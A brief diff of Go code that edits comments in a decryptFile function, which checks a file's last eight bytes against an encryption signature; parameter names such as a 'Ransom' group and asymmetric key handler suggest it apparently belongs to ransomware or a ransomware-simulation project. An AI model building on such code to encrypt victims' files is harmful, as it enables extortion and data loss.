@@ -536,16 +536,14 @@ func decryptFile(file File, cipher string, asymKeys AsymKeyHandler, group Ransom
 		return
 	}
 
-	// First we read last 8 bytes to determine the length of our embedded EDS (if it exists)
-	// This should be a uint64 value
+	// First we read last 8 bytes to determine if we have an encryption signature attached to it
 	b := make([]byte, 8)
 	offset := file.Size - 8
 	if offset <= 0 {
-		// file not encrypted, otherwise it would have a minimum size greater than 0 due to our appended key
 		return
 	}
 	inFile.ReadAt(b, offset)
-	// Now if a file is encrypted, b should be equal to our encryption signature
+	// Now if a file is encrypted, each byte should equal our known signature
 	for i, v := range b {
 		if v != encryptionSignature[i] {
 			return
